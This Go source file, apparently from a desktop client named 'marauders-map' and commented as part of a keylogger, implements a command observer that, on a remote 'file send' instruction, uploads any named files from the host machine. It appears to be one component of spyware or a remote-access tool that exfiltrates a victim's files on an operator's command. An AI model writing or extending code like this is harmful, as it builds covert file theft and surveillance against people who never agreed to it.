package internal

import (
	"log"
	"marauders-map-client-desktop/tools"
)

// KeyLogger commands Observer
type SendFileCmdObserver struct {
	sendFileCmd *SendFileCommand
}

func (o *SendFileCmdObserver) execute(cmd string, data []string) {
	if cmd != "file" {
		return
	}

	if len(data) <= 0 {
		return
	}

	action := data[0]

	switch action {
	case "send":
		files := data[1:]
		o.sendFiles(files)
		break
	}

}

func (o *SendFileCmdObserver) sendFiles(files []string) {
	for _, f := range files {
		if !tools.FileExists(f) {
			log.Printf("File requested '%s' doesn't exist\n", f)
			continue
		}

		o.sendFileCmd.Send(f)
	}
}

func NewSendFileCmdObserver(sendFileCmd *SendFileCommand) *SendFileCmdObserver {
	return &SendFileCmdObserver{
		sendFileCmd: sendFileCmd,
	}
}
